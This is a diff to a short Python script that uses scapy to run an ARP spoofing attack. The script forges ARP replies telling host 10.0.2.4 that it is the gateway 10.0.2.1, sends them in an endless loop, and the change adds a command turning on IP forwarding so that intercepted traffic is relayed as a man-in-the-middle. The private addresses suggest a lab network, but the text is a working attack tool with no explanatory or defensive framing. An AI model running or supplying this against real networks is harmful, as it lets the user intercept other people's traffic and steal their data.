@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import os
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -15,6 +16,8 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
+
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 while True:
     spoof("10.0.2.4", "10.0.2.1")
